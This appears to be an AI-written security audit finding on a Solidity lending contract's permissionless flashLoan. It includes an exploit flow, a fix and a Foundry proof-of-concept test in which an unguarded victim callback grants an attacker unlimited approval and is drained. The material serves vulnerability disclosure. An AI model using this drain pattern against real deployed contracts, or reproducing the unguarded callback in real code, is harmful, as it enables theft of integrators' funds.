The key code is already visible. Let me verify the exact `flashLoan` implementation and confirm there are no additional access controls.

### Title
Permissionless `flashLoan` callback invocation allows attacker to execute `onFlashLoan` on victim periphery contract with attacker-controlled `caller` - (`src/Midnight.sol`)

### Summary
`Midnight.flashLoan` is fully permissionless and accepts an arbitrary `callback` address with no restriction that it must equal `msg.sender`. It passes `msg.sender` (the attacker) as the `caller` argument to `IFlashLoanCallback(callback).onFlashLoan(msg.sender, ...)`. Any periphery contract implementing `IFlashLoanCallback` without validating `msg.sender == address(midnight)` can therefore be invoked by an attacker with an attacker-controlled `caller` value, enabling unauthorized execution of sensitive callback logic.

### Finding Description
**Exact code path** — `src/Midnight.sol` lines 737–752:

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    // ...
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    // ...
}
```

There is no check that `callback == msg.sender`, no whitelist, and no access control on the function itself. The grep confirms zero protocol-level enforcement of `msg.sender == MIDNIGHT` anywhere in the callback path.

**Attacker-controlled inputs:**
- `callback` → set to the victim periphery contract address
- `tokens` / `assets` → can be empty arrays (`[]`, `[]`); the `for` loops are skipped but the callback is still invoked unconditionally at line 746
- `data` → arbitrary bytes passed through to the victim

**Exploit flow:**
1. Attacker calls `midnight.flashLoan([], [], victimContract, attackerData)` — no tokens, no capital required
2. Both `safeTransfer` loops are skipped (length 0)
3. Midnight calls `victimContract.onFlashLoan(attacker, [], [], attackerData)` — `msg.sender` is `address(midnight)` but `caller` is `attacker`
4. Victim contract, lacking a `require(msg.sender == address(midnight))` guard, executes its logic with `caller = attacker`
5. If the victim grants approvals, updates state, or transfers tokens based on `caller`, the attacker benefits directly

**Why existing checks fail:** The only check in `flashLoan` is `tokens.length == assets.length` (line 740). There is no guard preventing an arbitrary third-party address from being supplied as `callback`. The `CALLBACK_SUCCESS` return-value check (line 745–748) only prevents silent failures; it does not prevent the callback from executing attacker-directed side effects before returning. [1](#0-0) [2](#0-1) 

### Impact Explanation
A victim periphery contract that implements `IFlashLoanCallback` and acts on the `caller` argument (e.g., granting token approvals, updating per-user state, initiating transfers) will execute that logic with `caller = attacker`. Concrete outcomes include: the victim contract approving the attacker to spend its tokens, the victim contract crediting the attacker with assets or permissions, or the victim contract performing state transitions that the attacker can subsequently exploit to drain funds. The impact is bounded by what the victim contract does inside `onFlashLoan`, but the attack vector is unconditional and requires zero capital.

### Likelihood Explanation
**Preconditions:**
1. A deployed periphery contract implements `IFlashLoanCallback` — this is the intended integration pattern
2. That contract does not validate `msg.sender == address(midnight)` inside `onFlashLoan` — a common omission given the interface provides no guidance and the `caller` parameter superficially appears to identify the initiator

**Feasibility:** The attack requires a single external call with empty arrays. No tokens, no approvals, no prior state setup. It is repeatable at will against any qualifying victim contract. The `testFlashLoan` test in `test/FlashloanTest.sol` (lines 38–39) itself demonstrates that `vm.prank(caller)` with an arbitrary `caller` address is the expected usage, confirming the permissionless design. [3](#0-2) 

### Recommendation
Add a restriction in `flashLoan` that `callback` must equal `msg.sender`, preventing any caller from targeting a third-party contract:

```solidity
require(callback == msg.sender, UnauthorizedCallback());
```

Alternatively, if third-party callbacks are intentional, the `IFlashLoanCallback` interface and all official periphery contracts must enforce:

```solidity
require(msg.sender == address(MIDNIGHT), Unauthorized());
```

and this requirement must be documented as a mandatory security invariant for all integrators.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IMidnight} from "src/interfaces/IMidnight.sol";
import {ERC20} from "test/erc20s/ERC20.sol";

/// Victim periphery: grants approval to whoever `caller` is, no msg.sender check.
contract VulnerableCallback is IFlashLoanCallback {
    ERC20 public token;
    address public approvedAttacker;

    constructor(ERC20 _token) { token = _token; }

    function onFlashLoan(address caller, address[] memory, uint256[] memory, bytes memory)
        external returns (bytes32)
    {
        // BUG: no require(msg.sender == address(midnight))
        token.approve(caller, type(uint256).max);
        approvedAttacker = caller;
        return CALLBACK_SUCCESS;
    }
}

contract AttackerTest is BaseTest {
    function testUnauthorizedFlashLoanCallback() public {
        VulnerableCallback victim = new VulnerableCallback(loanToken);
        deal(address(loanToken), address(victim), 1000e18);

        address attacker = address(0xbad);

        // Attacker calls flashLoan with empty arrays — zero capital required
        vm.prank(attacker);
        midnight.flashLoan(new address[](0), new uint256[](0), address(victim), "");

        // Assert: victim granted unlimited approval to attacker
        assertEq(loanToken.allowance(address(victim), attacker), type(uint256).max);
        assertEq(victim.approvedAttacker(), attacker);

        // Attacker drains victim
        vm.prank(attacker);
        loanToken.transferFrom(address(victim), attacker, 1000e18);
        assertEq(loanToken.balanceOf(attacker), 1000e18);
    }
}
```

**Expected assertions:** all three `assertEq` calls pass, confirming that the attacker obtained an unlimited approval from the victim contract and drained its balance via a single permissionless `flashLoan` call with no tokens and no capital.

### Citations

**File:** src/Midnight.sol (L737-752)
```text
    function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
        external
    {
        require(tokens.length == assets.length, InconsistentInput());
        emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
        }
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
        }
    }
```

**File:** src/interfaces/ICallbacks.sol (L24-26)
```text
interface IFlashLoanCallback {
    function onFlashLoan(address caller, address[] memory tokens, uint256[] memory assets, bytes memory data) external returns (bytes32);
}
```

**File:** test/FlashloanTest.sol (L38-49)
```text
        vm.prank(caller);
        midnight.flashLoan(tokens, amounts, address(this), data);

        assertEq(recordedTokens.length, tokens.length, "recorded tokens length");
        assertEq(recordedAmounts.length, amounts.length, "recorded amounts length");
        for (uint256 i = 0; i < tokens.length; i++) {
            assertEq(recordedTokens[i], tokens[i], "recorded token");
            assertEq(recordedAmounts[i], amounts[i], "recorded amount");
            assertEq(ERC20(tokens[i]).balanceOf(address(this)), 0, "balanceOf(this)");
            assertEq(ERC20(tokens[i]).balanceOf(address(midnight)), amounts[i], "balanceOf(midnight)");
        }
        assertEq(recordedCaller, caller, "recorded caller");
```
